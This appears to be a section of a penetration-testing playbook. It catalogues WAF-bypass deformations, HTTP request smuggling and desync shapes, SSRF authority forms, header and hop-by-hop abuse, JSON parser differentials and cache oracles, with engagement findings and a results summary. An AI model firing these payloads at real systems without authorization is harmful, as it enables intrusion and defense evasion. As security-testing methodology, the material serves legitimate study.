| 3 | **Query semantic split** — `?a=1;b=2` | Frameworks accepting `;` as a param separator split what `&`-based WAF query parsing sees as one value → rules anchored on a param boundary miss the second param | Mirror with `&` — behavior must match for `;` to be a real split; cross-check with O0 timing (does the `b` value traverse rules?) |
| 4 | **Trailing-slash matcher gap** — `/blocked/` vs `/blocked` | Spring 6/Boot 3 trailing-slash matching is OFF: `/blocked/` is a *different route* (usually 404 from the router, not the filter). A 200 from a controller = matcher gap | `/allowednonexistent/` must 404 identically to `/allowednonexistent`; a different 404 shape means the SPA fallback caught it — reclassify per §A's discriminator |
| 5 | **Dot-segment collapse point** — `/x/../blocked`, `/blocked/..`, `/a/../../blocked` | RFC 3986 `remove_dot_segments` is implemented differently per parser; over-root traversal collapses differently per component. The signal is *which layer collapses which sequences* | The identical sequence on the allowed path (must behave the same post-normalization) + `/zznonexistent/../blocked` — a 403 there means the edge matched the RAW path pre-collapse: that's the fingerprint |
| 6 | **Structural-char encoding** — `%3F`, `%23` in-path | Edge decodes-and-matches; origin decodes-and-*splits*: `%3F` turns the tail into a query string at the origin, `%23` truncates. Signal: the post-`%3F` part is treated as query (param echo) while the edge matched the whole string as path | `%3F` on the allowed path with a garbage tail — identical 404 to bare garbage means no split occurs on this stack |
| 7 | **Double-decode depth** — `%252f`, `%25%32%66`, k-fold k=1..3 | Measures each layer's decode depth: edge decoded once and matched (§A: `%252f` → `%2f`, blocked); origin may decode again. The signal is the depth at which the payload *settles* — where the 403/400/200 boundary moves per k | Per k, the allowed-path twin; a flip only on the blocked path at depth k = the edge's decode ceiling |
| 8 | **Empty-segment merging** — `//blocked`, `/blocked//`, `/api//blocked` | Servlet containers and proxies disagree on empty-segment merging; some treat `//` as semantically loaded inside the path. 200-vs-403 flip = components disagree on merging | `//zznonexistent` (must stay the router's 404); `//allowed` must equal `/allowed` — a size/status diff means `//` itself is load-bearing here |
| 9 | **Unicode case-folding** — Kelvin sign `K` (U+212A) for `k`, `İ` for `i`, ß for `ss` | ICU-based folders equate characters ASCII matchers don't (and vice versa): router folds, filter doesn't — or the reverse | Allowed-path twin; plus the raw-bytes echo check (does the origin see the same bytes you sent?) |
| 10 | **Control-char whitespace in path** — `%09`, `%0A`, `%0B`, `%0C`, `%0D`, `%20` at segment boundaries | Tomcat/others reject or strip specific control chars at specific parse stages; a strip-at-origin vs match-at-edge split is the bypass. (`%0B`/`%0C` are the chronically unfiltered ones) | Allowed-path twin + `/zznonexistent%0a` (must stay 404 — otherwise the edge is normalizing pre-match) |
| 11 | **Leading matrix segment** — `/;x=y/blocked` | An empty first segment with parameters: some parsers strip it (route shifts), some keep it (match shifts) | Allowed-path twin — `/;x=y/allowed` must equal `/allowed` |
| 12 | **Protocol-relative request target** — `GET //evil.test/x HTTP/1.1` | Per RFC 3986 relative resolution `//x` is an *authority*: origins that resolve the request-target may proxy, redirect, or route cross-host while the edge matched a path | `//zznonexistent` must stay the internal 404; watch for a `Location:` or an outbound hit on your receiver |
| 13 | **Asterisk / unusual request targets** — `OPTIONS *`, `GET *`, `CONNECT host:443` | Matchers anchored on path regexes never match `*`; server-level handlers bypass app-layer filtering wholesale | n/a — differential vs the allowed path's verb behavior; a `*` answer that isn't the app's 404 shape is the signal |
| 14 | **Duplicate Host** — two `Host:` headers with different values | Edge ACL reads the first, origin routes on the last (or vice versa): internal-vhost reachability through an external-facing check. F18 is the corpus anchor for Host surfaces | Single-Host baseline per value; response must fingerprint which vhost actually answered |
| 15 | **Exotic authority forms** — `Host: [::1]`, `::ffff:127.0.0.1`, decimal `2130706433`, octal `0177.0.0.1`, trailing dot `target.`, empty port `target:` | Validator-vs-resolver normalization gaps in authority parsing (SSRF-adjacent); some stacks dial what others reject | Point each form at your own receiver and record which literal the origin actually dialed — the canonical form is the control |
| 16 | **Raw `?`/`#` bytes in the request target** — unencoded, in path position | HTTP permits `?` mid-path; matchers anchoring "path before query" diverge from origin parsing that starts the query there | Allowed twin with the same suffix — identical treatment means no split on this stack |

Rule for the whole table: a variant is a bypass only when the discriminating signal appears on the blocked path **and** its negative control stayed clean. One flipped cell without its control is noise, not a finding.

### O2 Frame games — the layer after TE.TE

§C's ladder (CL.TE / TE.CL / TE.TE obfuscation, TE-folding, duplicate-CL) is dead on any maintained nginx/ATS edge — the corpus proved it. The modern frame layer attacks *semantics transition points* instead of header-case obfuscation:

| Vector | Literal shape | Why it still works somewhere |
|---|---|---|
| **CL malformations** | `Content-Length: 0x10` (hex → 16 or 0?), `+5`, `5,5` (RFC-legal list — first/last/sum/reject?), `5 5`, `00005` | RFC 7230 permits comma-lists; implementations diverge on hex/plus/duplicates. Frontend parses one way, backend another → framing desync with zero TE ambiguity |
| **Bare-LF chunked** | chunk-size lines terminated with `\n` instead of `\r\n`; `0\n\n` terminator | RFC violation tolerated by several implementations (various Go/Node/Java versions): frontend requires CRLF, backend accepts bare LF → smuggle |
| **Chunk extensions & trailers** | `5;x=y\r\n`; `Trailer: Content-Length` with CL declared in trailers after the chunked body | Trailer processing is the least-tested framing path; some stacks merge trailer headers into the message *after* framing decisions |
| **H2.CL downgrade desync** | h2 request with `content-length` header conflicting with actual DATA frames; or a client-supplied CL header that survives h2→h1 translation | h2→h1 translators must *rebuild* framing; those that forward client CL verbatim while trusting h2 DATA framing create the desync — the mainstream modern vector |
| **h2C upgrade bypass** | `GET / HTTP/1.1` + `Upgrade: h2c` + `HTTP2-Settings: <b64>` forwarded by the edge | Edge inspects the h1 request; origin accepts the upgrade and speaks h2c cleartext from there — subsequent frames never traverse edge inspection. Works only where the edge forwards `Upgrade`/`Connection`: its websocket whitelist becomes the hole |
| **CL.0 desync** | `Content-Length: 0` on a route whose handler ignores CL while body bytes follow | Origin routes on CL=0 but the body bytes stay on the reused connection → the *next* request desyncs. Requires no TE ambiguity at all — pure route-dependent framing neglect |
| **Client-side desync (CSD)** | CL.0 first-breath request, then a second in-flight request whose bytes get consumed as the smuggled prefix | Browser connection reuse and receiver logs demonstrate the framing differential without requiring server-side desync |
| **h2 pseudo-header abuse** | duplicate `:path`, `:method` case-mixing (`gET`), `:path` with leading whitespace/tab, regular header placed before the pseudo-headers | HTTP/2 forbids leniency; some stacks grant it — and h2→h1 translators then emit malformed downstream requests. (Pairs with O4's verb layer) |
| **0-length chunk + WS downgrade** | `Transfer-Encoding: chunked` + immediate `0\r\n\r\n` + smuggled suffix; `Upgrade: websocket` handshake with smuggled trailing bytes | Terminators that accept an empty chunked body with trailing bytes hand the connection state to the attacker before inspection resumes |

### O3 Invisible bodies — the inspector can't parse it, the origin must

| Vector | Shape | Signal |
|---|---|---|
| **gzip body** | `Content-Encoding: gzip` + gzipped JSON | WAFs that skip decompression inspect compressed bytes; origin decodes. 403→200 flip = no decompression at the edge |
| **Charset lie** | `Content-Type: application/json; charset=utf-16` + UTF-16LE-encoded body | Inspector decodes as UTF-8/ASCII → mojibake matches no rule; origin honors the declared charset |
| **Multipart confusion** | duplicate `boundary=` declarations (header vs part-body disagreement), boundary-in-filename, `Content-Type: application/json` *inside* a form part | Parsers pick first/last boundary differently; some frameworks JSON-decode a part whose part-level CT says json |
| **Inspection truncation** | payload placed beyond the inspector's max-inspected-body window, padded inside a large benign string value | Binary-search the window: place a rule-matching-but-harmless marker at increasing offsets; the offset where the 403 stops appearing is the inspection window — everything past it is uninspected |
| **Stacked content-encoding** | `Content-Encoding: gzip` applied twice; `chunked` + `gzip` interplay | Inspectors that decode one layer vs origins that decode both — the differential window is the bypass |
| **Lenient-JSON gap** | JSON5/JSONC shapes: comments, trailing commas, single quotes, unquoted keys, `NaN`/`Infinity` literals | Inspector's strict JSON parse fails → body skipped; consumer's lenient parser accepts — the parse-failure bypass, body-side |
| **BOM prefix** | UTF-8 BOM before the JSON body | Strict parsers error out (→ skip inspection); lenient consumers strip the BOM and proceed |
| **Trailing garbage** | valid JSON followed by suffix bytes within the same Content-Length | Prefix-parsing validators validate the JSON; whole-body consumers process everything — and it bridges directly into §O2 framing games |
| **TLS 1.3 early-data** | 0-RTT replay carrying a pre-inspected request | Some edges skip or defer inspection for early data; replay the same request as 1-RTT vs 0-RTT and diff the verdicts |

415 on any of these is a **negative** — the origin's parser refused the shape. Record it as tried-and-dead, not "almost".

### O4 Verb layer

- **Fat GET** — GET with a JSON body + `Content-Type: application/json`: some custom handlers parse GET bodies even though the stack's auth treats GET as read-only-by-definition. Signal: body-derived parameters or state-changing behavior from a verb the filter never inspects.
- **OPTIONS routing oracle** — `OPTIONS /path` returns `Allow:` with zero business-logic execution: the cheapest route-table enumeration there is, and it exposes verbs the filter forgot (PATCH and HEAD are chronically under-filtered). Negative control: `OPTIONS /zznonexistent` — a 200 with `Allow:` there means OPTIONS is answered pre-routing: an oracle about the filter, not the router.
- **Method override** (`X-HTTP-Method-Override`, `?_method=`) — only meaningful when auth is *verb-based*. §B is the instance: AcmeAuth's override probes returned 401 because auth is path-based — the verb never mattered. Fingerprint first (O0), then spend this variant.
- **Server-level verbs** — `TRACE` (XST + proxy behavior), `CONNECT` (tunnel semantics at odd layers), and unknown custom verbs (`ZPROBE`): custom verbs frequently skip both verb-auth tables *and* body inspection, and some stacks route them to default handlers. Signal: any answer that is not the app's standard 404/405 envelope.
- **h2 pseudo-method** — `:method: gET` case-mixing and duplicate `:path` pseudo-headers (pairs with §O2): verb-authorization tables comparing exact strings diverge from routers that case-fold.

### O5 Authority & hop-by-hop confusion

- **Absolute-URI request line** — `GET http://internal-vhost/path HTTP/1.1`: the edge routes and inspects by `Host:` header, the origin may route by the absolute-URI. Different vhosts, different rule sets. Signal: origin behavior diverges from the Host-header twin while the edge verdict stays identical.
- **Host component parsing** — `Host: external@internal`, `internal:80@external`, trailing-dot, `%2e`-encoded labels: WHATWG (browser-style) and RFC 7230 authority parsers split on `@` differently — validator keeps one side, router dials the other. F18's Host-reflection instance is the corpus anchor; this is the same surface with component-level deformations.
- **Underscore/dash header ambiguity** — `X_Forwarded_For: a` + `X-Forwarded-For: b` sent together: nginx drops underscore headers by default (`underscores_in_headers off`), some proxies and app frameworks read either spelling. Edge inspects one, origin trusts the other. Signal: an SSRF callback or behavior differential that reveals which spelling the origin consumed.
- **Hop-by-hop stripping** — `Connection: X-Internal-User, X-Real-IP`: everything named in `Connection` is hop-by-hop and intermediaries must strip it. Two exploits: (a) strip a header the EDGE added and the ORIGIN trusts — the origin falls back to attacker-controllable originals; (b) strip a header the WAF's rules were keyed on, changing downstream parsing. *Your whitelist becomes their bypass*: enumerate which headers the edge adds (response header diff with/without), then name each in `Connection:` on the blocked path.
- **Duplicate Host** — two `Host:` headers, different values: first-vs-last ownership differs per component (§O1 #14 at authority level — edge ACLs and origin routers frequently disagree about *which* Host is real).
- **XFF chain trust** — `X-Forwarded-For: 1.2.3.4, 5.6.7.8`: leftmost-vs-rightmost trust, append-vs-overwrite semantics. Signal: rate-limit or IP-based logic reacting to a different chain element than you assumed. Control: single-element chains per position.
- **Forwarded (RFC 7239) family mismatch** — `Forwarded: for=…;host=…;proto=https` vs the `X-Forwarded-*` family: components honoring different families → scheme/host divergence (open redirects, cache-key splits, absolute-URL generation). Send both, disagreeing.
- **Via / Proxy-* injection** — proxy-chain headers that some components treat as routing or trust input; inject and watch for behavior change on the blocked path.
- **Exotic authority forms** — IPv6 brackets `[::1]`, IPv4-mapped `::ffff:127.0.0.1`, decimal `2130706433`, octal `0177.0.0.1`, trailing dot, empty port: validator-vs-resolver normalization gaps. Confirm with your own receiver which literal the origin actually dialed; the canonical form is the control.

### O6 Body-structure differentials (mechanized: [body-mutator.js](../scripts/body-mutator.js))

Parser disagreement inside JSON — the body-side sibling of §O2:

| Differential | Shape | Who disagrees |
|---|---|---|
| **Duplicate keys** | `{"amount":1,"amount":1000}` | Validator reads first, consumer reads last (Jackson: last; hand-rolled validators: usually first) — the structural parser differential |
| **`\u002f` unicode escapes** | `{"url":"https:\/\/evil.test\/x"}` | Checks over the *serialized* form miss the decoded `/`; consumers decode |
| **Number forms** | `1e0`, `1.00`, `-0`, `1e2`, `1e999` (→ Infinity or error), 2^53+1 (JS precision loss) | Value-comparison authorization checks confused by representation, not value |
| **Depth/size limits** | validator caps at N, consumer parses deeper/wider | Validation ran on a truncated view; the consumer processed everything |
| **Homoglyph keys** | `"аdmin"` (Cyrillic а) alongside `"admin"` | Normalizing consumers merge keys the validator saw as distinct — or validate the merged form while the consumer keeps both |
| **Lenient-JSON / BOM / trailing garbage** | see §O3 rows | The body-side parse-failure bypass shows up here as "validation never ran" |

All four are mechanized: `node scripts/body-mutator.js body.json --profiles dup-keys,json-escapes,number-forms,deep-nest` — one hypothesis per mutant, into the ledger.

### O7 Cache as WAF oracle

Cross-reference: [cache-poisoning.md](cache-poisoning.md) (the recipe lives there; not repeated here). The edge-specific use: HIT/MISS is a side channel for WAF verdicts you don't want to trigger directly — send the deformation with a unique marker; a cached response proves the request reached and returned from origin, a permanent MISS+403 proves the rule fired. Cached 403 envelopes also let you fingerprint rule-set generations offline: collect, diff, decode the rule changes across days without re-firing anything.

**Cache-key divergence as a bypass amplifier**: `Vary` misuse, `Accept-Encoding` variants, header case/order in the key — the same URL can carry one verdict at the edge cache and a different one at origin. A cached-PASS under a variant key while the bare key caches a 403 is a bypass that never touches the WAF twice. (Deception direction — stealing authenticated pages via cacheable suffixes — is in [cache-poisoning.md](cache-poisoning.md) §4.)

### O8 The meta-method — the differential matrix as a reusable artifact

1. **Fingerprint** (O0): edge identity, normalization set, 404/403 boundary, rule-generation timing signature.
2. **Enumerate the normalization set**: which O1/O2/O5 deformations each component canonicalizes.
3. **Fill the differential matrix** — one row per deformation, one column per component decision. Persist as `<target>-diffmatrix.tsv`: `variant<TAB>edge-verdict<TAB>origin-verdict<TAB>route-verdict<TAB>notes` (verdicts = status + response-hash prefix).
4. **Fire only at divergence points.** Rows where all components agree are dead — no payload ever goes there. Each divergent row gets exactly one real payload, two-sided evidence where applicable (Lesson 9), and the per-variant negative control from O1.
5. **Negatives are product too** — every dead variant lands in [killed-hypotheses.md](killed-hypotheses.md) with the matrix cell that killed it.
6. **The matrix is the reusable artifact.** Next target on the same vendor/stack: load the previous matrix, re-run only the O0 fingerprint; cells that match the old matrix transfer as-is, cells that differ are that target's customizations. That is the difference between a report and a skill.

**Automation: [edge-mapper.sh](../scripts/edge-mapper.sh) runs steps 1–3 end-to-end** — normalization fingerprint over ~24 deformations × blocked/allowed twins, 404/403 boundary, verb oracle, unknown-verb probe, with the cache-buster FP control built into every probe — and emits `<host>-diffmatrix.tsv` plus the divergence list. Fire real payloads only at what it marks divergent (step 4).

---

## Summary statistics

- **Total distinct technique variants attempted:** ~145 (skill-author estimate; not a corpus figure. The tables above are the authoritative count.)
- **WORKED (live exploit):** F13 (FIDO2 injection), F22 (FIDO1 UAF), F5/F7/F9 (authz bypass — remediated), C1/C2/C3/C4 (SSRF — remediated), F23 (Affirm SSRF), F24 (reCAPTCHA bypass), F18 (Host injection), plus the info-leak/Low class (F6/F10/F11/F12/F14–F21/F26–F32).
- **BLOCKED by WAF/ALB:** everything in sections A (except case-variant), C (smuggling), D (traversal), E (SQLi time/error/boolean), H (SpEL), I (WAF-bypass obfuscation), J1/J2 (SCG/SCF CVEs).
- **4xx-no-sink / app-layer-safe:** F (SSTI), G (Jackson), most of A/N.
- **Hard-goal {RCE, reflected-SSRF-w/body, SSTI, SQLi}:** 1/3 (reflected SSRF, via 4 paths C1–C4, now remediated). RCE/SSTI/SQLi all gated by CC-admin auth or parameterized queries.
- **§O (O0–O8):** open battery — deliberately not corpus-counted. Outcomes go to `<target>-diffmatrix.tsv` (§O8) and [killed-hypotheses.md](killed-hypotheses.md).

**The single recurring defense pattern:** AcmeAuth's edge = SCG returning `{"detail":"Ensure the URL is valid",...}` 403, backed by an actively-maintained WAF that normalizes case, comments, versioned MySQL hints, encoding, and matrix params. The only thing that ever got past the WAF path-filter was case-variation, and Spring's case-sensitive routing neutralized it. Every other technique in this catalogue was blocked at the edge or handled safely by parameterized JPA / disabled Jackson default typing / no template engine on the response path.

---

## Most reusable takeaways for future engagements

1. The full `/env` WAF-bypass matrix in section A/I is a turnkey WAF-fingerprinting payload set.
2. The 5-class auth-bypass battery — path-confusion headers / Spring MVC traversal / filter-vs-DispatcherServlet disagreement / method tampering / Host-Forwarded smuggling — is a complete "can I get past an auth filter" checklist.
3. The negative-control discipline (F25 retraction) for any enumeration oracle.
4. The "valid-body not empty-`{}`" rule (F7 methodology) for confirming authz bypass vs framework deser 400s.
5. The SCG-path-bypass + Spring-rejects-malformed two-layer observation as the model for why `..;/` traversal rarely yields data even when it reaches the backend.
6. The §O differential matrix (O8): fingerprint → normalization-set enumeration → matrix → fire only at divergence points — and the matrix file itself transfers to the next target on the same stack.

---
